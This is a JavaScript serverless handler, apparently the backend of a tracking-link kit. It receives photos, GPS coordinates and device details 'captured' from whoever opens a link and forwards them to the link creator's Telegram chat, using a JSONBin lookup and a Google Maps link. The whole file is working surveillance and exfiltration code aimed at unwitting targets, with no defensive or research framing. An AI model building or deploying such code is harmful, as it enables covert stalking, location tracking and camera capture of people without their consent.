export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;
  const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
  const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;

  const { linkId, type, photoData, coords, user_agent, screen_res, platform, language } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // STEP 1: Look up who created this link
    let targetChatId = ADMIN_ID;
    let creatorName = 'Unknown';
    
    try {
      const lookupResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
        headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
      });
      const jsonbinData = await lookupResponse.json();
      const links = jsonbinData?.record?.links || {};
      const linkData = links[linkId];
      
      if (linkData && linkData.creator_chat_id) {
        targetChatId = linkData.creator_chat_id;
        creatorName = linkData.creator_name;
      }
    } catch (e) {
      console.log('JSONBin lookup failed, sending to admin');
    }

    console.log(`Sending to chat_id: ${targetChatId}, type: ${type}`);

    // STEP 2: Handle PHOTO
    if (type === 'photo' && photoData) {
      try {
        const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        console.log(`Photo buffer size: ${buffer.length} bytes`);

        // Build multipart form data manually
        const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
        
        let bodyParts = [];
        
        // chat_id field
        bodyParts.push(Buffer.from(
          `--${boundary}\r\n` +
          `Content-Disposition: form-data; name="chat_id"\r\n\r\n` +
          `${targetChatId}\r\n`
        ));
        
        // photo field
        bodyParts.push(Buffer.from(
          `--${boundary}\r\n` +
          `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n` +
          `Content-Type: image/jpeg\r\n\r\n`
        ));
        
        bodyParts.push(buffer);
        
        // closing boundary
        bodyParts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
        
        const finalBody = Buffer.concat(bodyParts);

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': finalBody.length.toString()
          },
          body: finalBody
        });
        
        const result = await response.json();
        console.log('Telegram photo response:', JSON.stringify(result));
        
        if (!result.ok) {
          // If photo send fails, send the base64 as text
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: targetChatId,
              text: `📸 Photo captured but couldn't send as image.\nBase64 length: ${photoData.length} chars\nError: ${result.description}`
            })
          });
        }
      } catch (photoError) {
        console.error('Photo send error:', photoError);
        
        // Fallback: send text notification
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: targetChatId,
            text: `📸 **Photo Captured!**\n\nPhoto data received but send failed.\nError: ${photoError.message}`,
            parse_mode: 'Markdown'
          })
        });
      }
    }

    // STEP 3: Handle LOCATION
    if (type === 'location' && coords && coords.lat && coords.lng) {
      const message = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
Accuracy: ${coords.accuracy || 'N/A'} meters
🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    // STEP 4: Handle INFO (device details)
    if (type === 'info') {
      let message = `🛡️ **Device Info Captured!**\n\n`;
      message += `📱 Platform: ${platform || 'Unknown'}\n`;
      message += `🖥️ Screen: ${screen_res || 'Unknown'}\n`;
      message += `🗣️ Language: ${language || 'Unknown'}\n`;
      message += `⏰ Time: ${new Date().toISOString()}\n\n`;
      message += `✅ Camera: ${req.body.hasCamera ? 'Yes' : 'No'}\n`;
      message += `✅ Location: ${req.body.hasLocation ? 'Yes' : 'No'}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    res.status(200).json({ success: true, sentTo: targetChatId });
    
  } catch (error) {
    console.error('Fatal error:', error);
    res.status(500).json({ error: 'Internal server error: ' + error.message });
  }
}
